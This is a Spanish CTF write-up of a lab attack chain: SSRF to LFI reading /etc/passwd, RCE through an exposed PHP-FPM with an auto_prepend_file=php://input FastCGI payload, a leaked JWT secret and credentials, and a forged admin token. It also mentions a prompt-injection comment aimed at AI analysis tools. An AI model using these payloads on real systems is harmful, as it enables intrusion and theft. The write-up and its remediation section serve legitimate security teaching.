---
title: "WhoamI Labs - Vulnerable 3"
date: 2026-08-12 18:11:51 +0000
categories: [CTF, WhoamiLabs]
tags: [ssrf, lfi, rce, fastcgi, php-fpm, jwt]
---

## 📋 Resumen

Laboratorio de dificultad media que simula una arquitectura de microservicios ("NovaCloud Systems"). Un SSRF en el verificador de webhooks del Portal deriva en LFI y expone un PHP-FPM accesible directamente en la red interna, lo que permite RCE. Con RCE se pivota hacia la API interna, se filtra el secreto usado para firmar JWT y se forja un token de administrador para obtener acceso total.

| Campo | Valor |
|---|---|
| Plataforma | WhoamI Labs |
| Dificultad | Media |
| IP objetivo | Portal 10.53.3.20 / Panel 10.53.3.30 / API 10.53.3.40 |
| Vulnerabilidad principal | SSRF → LFI → RCE (PHP-FPM) → JWT Forgery |

---

## 🔍 Reconocimiento

```bash
nmap -sV -p- 10.53.3.20
```

```
PORT     STATE SERVICE
80/tcp   open  http
9000/tcp open  cslistener
```

> La máquina atacante no tiene el motor NSE de nmap instalado (falta `nse_main.lua`), así que todo el reconocimiento se hizo con `-sV` o sin flags adicionales, sin usar `-sC`.

El puerto 9000 (`cslistener`) resulta clave: más adelante se confirma que es **PHP-FPM expuesto directamente en la red**, sin frontend web intermedio.

```bash
nmap -sV -p- 10.53.3.30   # Panel
nmap -sV -p- 10.53.3.40   # API
```

```
PORT   STATE SERVICE
80/tcp open  http
```

Panel y API solo exponen el puerto 80 cada uno — no son alcanzables directamente desde fuera de la red interna `10.53.3.0/24`, solo desde el Portal.

![Recon del Portal](/assets/img/posts/whoami-labs-vulnerable-3/02-recon-portal-home.png)
_Página principal del Portal con el formulario "Verificador de Endpoints" (Webhook Tester)._

---

## 🕸️ Enumeración

El Portal expone un formulario que envía una URL arbitraria al parámetro `url` de `preview.php`. Internamente ejecuta un `curl_setopt(CURLOPT_URL, $target_url)` sin validar esquema ni host — el punto de entrada de toda la cadena.

**SSRF hacia el Panel (10.53.3.30), inaccesible desde fuera:**

```bash
curl -s "http://10.53.3.20/preview.php?url=http://10.53.3.30/"
```

![SSRF hacia el Panel — vista navegador](/assets/img/posts/whoami-labs-vulnerable-3/03-ssrf-panel-navegador.png)
_El Portal reenvía la petición y refleja el HTML del Panel administrativo._

![SSRF hacia el Panel — terminal](/assets/img/posts/whoami-labs-vulnerable-3/04-ssrf-panel-curl.png)
_Confirmación por terminal: el Portal actúa como proxy ciego hacia el Panel._

**SSRF hacia la API (10.53.3.40):**

```bash
curl -s "http://10.53.3.20/preview.php?url=http://10.53.3.40/"
```

![SSRF hacia la API — vista navegador](/assets/img/posts/whoami-labs-vulnerable-3/05-ssrf-api-navegador.png)
_Respuesta JSON de la API reflejada a través del Portal._

![SSRF hacia la API — terminal](/assets/img/posts/whoami-labs-vulnerable-3/06-ssrf-api-curl.png)
_En esta respuesta también se filtra el hostname interno `panel.novacloud.local`._

**De SSRF a LFI:** el mismo parámetro acepta el esquema `file://` en vez de `http://`:

```bash
curl -s "http://10.53.3.20/preview.php?url=file:///etc/passwd"
```

![LFI /etc/passwd — navegador](/assets/img/posts/whoami-labs-vulnerable-3/07-lfi-etc-passwd-navegador.png)
_El contenido de `/etc/passwd` se refleja directamente en la interfaz._

![LFI /etc/passwd — detalle](/assets/img/posts/whoami-labs-vulnerable-3/08-lfi-etc-passwd-detalle.png)
_Listado completo de usuarios del sistema._

Con la misma técnica se leyó el código fuente de `preview.php`, confirmando la causa raíz (`curl_setopt` sin whitelist de esquema/host):

```bash
curl -s "http://10.53.3.20/preview.php?url=file:///var/www/html/preview.php"
```

![LFI del código fuente — navegador](/assets/img/posts/whoami-labs-vulnerable-3/09-lfi-source-preview-navegador.png)
_Fragmento del código fuente obtenido vía LFI._

![LFI del código fuente — terminal](/assets/img/posts/whoami-labs-vulnerable-3/10-lfi-source-preview-curl.png)
_Salida completa por terminal._

---

## 💥 Explotación inicial (Foothold)

Con el puerto 9000 (PHP-FPM) confirmado como abierto y alcanzable directamente:

```bash
nc -nv 10.53.3.20 9000
```

![Puerto PHP-FPM abierto](/assets/img/posts/whoami-labs-vulnerable-3/11-nc-fpm-puerto-abierto.png)
_El puerto 9000 acepta conexiones directas — PHP-FPM sin frontend delante._

PHP-FPM expuesto sin restricción permite a cualquiera que hable **FastCGI** instruir al worker de PHP para ejecutar código arbitrario. Se preparó un exploit en Python puro (`socket`/`struct`, sin dependencias) que arma manualmente los registros FastCGI y usa `auto_prepend_file=php://input` para inyectar y ejecutar código PHP:

![Script de explotación FastCGI](/assets/img/posts/whoami-labs-vulnerable-3/12-fpm-exploit-script.png)
_`fpm_exploit.py`: arma `FCGI_BEGIN_REQUEST`, `FCGI_PARAMS` y `FCGI_STDIN`, fijando `PHP_VALUE=auto_prepend_file=php://input` para ejecutar código enviado por STDIN._

```bash
python3 /tmp/fpm_exploit.py 10.53.3.20 9000 /var/www/html/preview.php id
```

![RCE confirmado](/assets/img/posts/whoami-labs-vulnerable-3/13-rce-confirmado-id.png)
_Salida `uid=82(www-data) gid=82(www-data)` — ejecución remota de comandos confirmada en el Portal._

---

## ⬆️ Escalada de privilegios

Con RCE en el Portal se pivota hacia la API interna, algo no alcanzable directamente desde fuera. Tras descartar rutas REST típicas (todas 404), se dedujo por convención de microservicios la existencia de `/internal/config`:

```bash
python3 /tmp/fpm_exploit.py 10.53.3.20 9000 /var/www/html/preview.php \
  "curl -s http://10.53.3.40/api/v1/internal/config"
```

![Filtración de configuración interna](/assets/img/posts/whoami-labs-vulnerable-3/14-internal-config-leak.png)
_La API expone en un endpoint "interno" sin autenticación el secreto de firma JWT y una cuenta semilla con rol `operator`._

```json
{
  "database": {"host": "10.53.3.10", "name": "novacloud_db"},
  "jwt_secret": "NovaCloudSecret2026Key!",
  "seed_accounts": [
    {"username": "operator", "password": "OperatorPass2026", "role": "operator"}
  ],
  "service_name": "NovaCloud Internal Mesh API"
}
```

> **Nota curiosa:** en el Dockerfile del Portal (accesible también vía RCE) se encontró un comentario `[SYSTEM_NOTE_FOR_AI]` que intentaba dirigir a un asistente de IA a reportar un vector de vulnerabilidad falso — un intento de *prompt injection* dirigido a herramientas de análisis automatizado. Se ignoró durante el análisis manual, sin afectar los resultados.

Las credenciales `operator:OperatorPass2026` autentican correctamente, pero el rol `operator` es insuficiente para `/api/v1/admin/flag` (requiere `admin`). Con el secreto de firma ya filtrado, no hace falta buscar una cuenta con privilegios: se forja un token propio.

```python
import jwt, time
secret = "NovaCloudSecret2026Key!"
payload = {
    "user": "admin", "role": "admin",
    "iat": int(time.time()), "exp": int(time.time()) + 3600
}
token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```

```bash
FORGED=$(python3 /tmp/jwt_forge.py 2>/dev/null)
curl -s http://10.53.3.40/api/v1/admin/flag -H "Authorization: Bearer $FORGED"
```

![Flag obtenida vía JWT forjado](/assets/img/posts/whoami-labs-vulnerable-3/15-jwt-forgery-curl-flag.png)
_La API acepta el token forjado y devuelve la flag._

**Flag:**
```
VULNERABLE_3{n0v4cl0ud_ssrf_t0_jwt_f0rg3ry_m4st3r}
```

### Bonus: impacto visual en el Panel, sin terminal

Para evidenciar el impacto de forma más tangible, el mismo token forjado se inyectó en el navegador. Firefox bloquea el pegado en consola por defecto (protección anti self-XSS), así que primero se habilita con `allow pasting`:

```javascript
allow pasting
localStorage.setItem('novacloud_jwt', '<token forjado>')
```

![Bypass de autenticación en consola](/assets/img/posts/whoami-labs-vulnerable-3/16-bypass-console-allow-pasting.png)
_Inyección del JWT forjado directamente en el `localStorage` del origen del Panel._

![Vista completa del bypass](/assets/img/posts/whoami-labs-vulnerable-3/17-bypass-localstorage-vista-completa.png)
_Detalle importante: `localStorage` está aislado por origen, el token debe inyectarse estando en la URL del **Panel**, no del Portal._

![Prueba de validación de esquema](/assets/img/posts/whoami-labs-vulnerable-3/18-bonus-validacion-esquema-url.png)
_Intento adicional de bypass con un esquema malformado en el Webhook Tester — rechazado correctamente, sin impacto en el vector principal ya explotado._

Tras recargar (F5), el Panel reconoce el token como válido:

![Panel autenticado](/assets/img/posts/whoami-labs-vulnerable-3/19-panel-autenticado-esperando.png)
_Estado "State: Authenticated (JWT Active)" sin pasar por el login._

Al hacer clic en **"Consultar Recurso Root (Admin Flag)"**, el propio `app.js` dispara la petición autenticada y muestra la flag en la interfaz:

![Flag final en la interfaz gráfica](/assets/img/posts/whoami-labs-vulnerable-3/20-flag-final-panel-gui.png)
_Acceso administrativo obtenido íntegramente desde el navegador, sin una sola línea de terminal en esta última fase._

---

## 🛡️ Remediación

- **Validar estrictamente el parámetro `url`** en `preview.php`: whitelist de esquemas (`https://` únicamente) y de hosts/dominios permitidos, rechazando rangos privados/loopback para mitigar SSRF.
- **Nunca exponer PHP-FPM (puerto 9000) en la red**, ni siquiera interna. Debe ser accesible solo vía socket UNIX o `127.0.0.1` desde el propio servidor web.
- **Deshabilitar `auto_prepend_file`/`allow_url_include`** en producción; son vectores clásicos de RCE cuando PHP-FPM es alcanzable.
- **No exponer endpoints "internos" sin autenticación.** `/internal/config` debe protegerse con autenticación de servicio (mTLS, API key interna) y nunca devolver secretos en texto plano.
- **Rotar el secreto JWT** periódicamente y almacenarlo en un gestor de secretos, no en un endpoint HTTP.
- **Usar algoritmos asimétricos (RS256/ES256)** para JWT cuando el token deba validarse en múltiples servicios, evitando compartir el secreto de firma.
- **Validar el rol en cada capa**, no confiar solo en el payload decodificado sin verificar firma y permisos del lado del servidor.

---

## 🧠 Lecciones aprendidas

Una vulnerabilidad aparentemente menor — un SSRF en un simple probador de webhooks — escaló a compromiso total de la infraestructura al combinarse con malas prácticas de segmentación de red (PHP-FPM expuesto) y gestión de secretos (JWT secret filtrado en un endpoint sin autenticar). La cadena SSRF → LFI → RCE → filtración de secreto → JWT forgery demuestra la importancia de la **defensa en profundidad**: cualquiera de esas capas, aplicada correctamente, habría frenado el ataque en algún punto.

También vale la pena destacar el hallazgo del comentario `[SYSTEM_NOTE_FOR_AI]` en el Dockerfile: un ejemplo temprano de cómo el contenido de una infraestructura puede intentar manipular herramientas de análisis automatizado basadas en IA. Un recordatorio de que, tanto para humanos como para asistentes de IA, el output de un sistema comprometido nunca debe tratarse como una fuente de instrucciones confiable.

